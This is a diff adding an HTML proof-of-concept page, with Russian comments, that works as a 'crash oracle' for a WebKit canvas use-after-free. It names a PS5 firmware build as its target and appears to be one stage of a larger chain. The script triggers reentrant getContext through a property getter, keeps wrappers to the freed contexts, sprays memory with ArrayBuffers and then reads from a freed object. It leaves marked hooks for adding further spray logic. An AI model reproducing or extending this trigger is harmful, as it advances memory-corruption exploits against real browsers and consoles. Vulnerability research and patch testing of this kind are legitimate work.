@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<!--
+  entry-1422 / p3 — crash-oracle (ТОЛЬКО после того, как p1 дала VULNERABLE).
+
+  Что делает: повторяет same-type реентерабельный триггер, оставляет живыми только
+  JS-обёртки внутренних контекстов (C++ объект уже освобождён), затем давит на память
+  и в конце ЧИТАЕТ свойство у освобождённого контекста (inner.lineWidth).
+  На сборке без фикса (ветка 7617, PS5 14.10 по публичным прогонам) чтение
+  `m_stateStack`/`deref` у freed-объекта роняет WebProcess — это и есть наблюдаемый
+  результат. На исправленной сборке страница доживает до P3-SURVIVED.
+
+  Страница ничего не пишет в освобождённую память и не строит R/W — только чтение,
+  чтобы получить crash/no-crash. Это НЕ эксплойт.
+
+  Защита от случайного запуска: без ?armed=1 страница только показывает инструкцию.
+  На консоли каждая смерть WebProcess = перезагрузка страницы/консоли: счётчик попыток
+  держите в блокноте (localStorage на консоли может не сохраняться между запусками).
+
+  Точки расширения: // EXT.
+-->
+<meta charset="utf-8">
+<title>entry-1422 p3 crash oracle (armed only)</title>
+<style>
+  body{font:14px/1.45 monospace;background:#111;color:#ddd;margin:16px}
+  #out{white-space:pre-wrap;background:#000;padding:10px;border:1px solid #333}
+  .warn{color:#f77}
+</style>
+<h1>p3 — crash oracle (реентерабельный getContext)</h1>
+<pre id="out">…</pre>
+<script>
+(function () {
+  "use strict";
+  var out = document.getElementById("out");
+  var armed = /[?&]armed=1(&|$)/.test(location.search);
+  var BEACON = location.origin + "/beacon";
+
+  function emit(tag, extra) {
+    var rec = { tag: tag, extra: extra || null, t: (new Date()).toISOString() };
+    try {
+      if (typeof fetch === "function")
+        fetch(BEACON, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(rec) });
+    } catch (e) {}
+    out.textContent += "\n" + tag + (extra ? " " + JSON.stringify(extra) : "");
+  }
+
+  if (!armed) {
+    emit("P3-DISARMED", { hint: "append ?armed=1 to run; run p1 first" });
+    return;
+  }
+
+  emit("P3-START", { ua: navigator.userAgent });
+
+  // 1) создать N освобождённых контекстов с живыми JS-обёртками
+  var wrappers = [];
+  var N = 8;
+  for (var i = 0; i < N; i++) {
+    var canvas = document.createElement("canvas");
+    canvas.width = 1; canvas.height = 1;
+    var inner = null, outer = null, fired = 0;
+    try {
+      // В 2d-словаре WebKit член alpha закомментирован (IDL FIXME), поэтому
+      // реентерабельность для 2d ведём через desynchronized (=false -> false).
+      var opts = {};
+      Object.defineProperty(opts, "desynchronized", {
+        get: function () { fired++; if (fired === 1) inner = canvas.getContext("2d"); return false; }
+      });
+      outer = canvas.getContext("2d", opts);
+    } catch (e) { emit("P3-TRIGGER-ERR", { i: i, err: e.name + ":" + e.message }); }
+    if (inner) wrappers.push(inner);   // outer намеренно не держим
+    emit("P3-TRIGGERED", { i: i, fired: fired, hasInner: !!inner, hasOuter: !!outer });
+    // EXT: здесь можно добавить спрей/удержание, если понадобится другой сценарий.
+  }
+
+  // 2) давление на память, чтобы освобождённые слоты были переиспользованы
+  var trash = [];
+  for (var k = 0; k < 64; k++) {
+    try { trash.push(new ArrayBuffer(768)); } catch (e) {}
+  }
+  emit("P3-SPRAYED", { wrappers: wrappers.length, trash: trash.length });
+
+  // 3) чтение свойства у освобождённого контекста — единственный load-bearing шаг
+  var before = wrappers[0];
+  emit("P3-BEFORE-DEREF", { haveWrapper: !!before });
+  if (before) {
+    try {
+      var v = before.lineWidth;   // deref CanvasRenderingContext, если он freed -> crash
+      emit("P3-AFTER-DEREF", { lineWidth: v });
+    } catch (e) {
+      emit("P3-DEREF-THREW", { err: e.name + ":" + e.message });
+    }
+  }
+  emit("P3-SURVIVED", { wrappers: wrappers.length });
+  document.title = "p3 SURVIVED";
+})();
+</script>
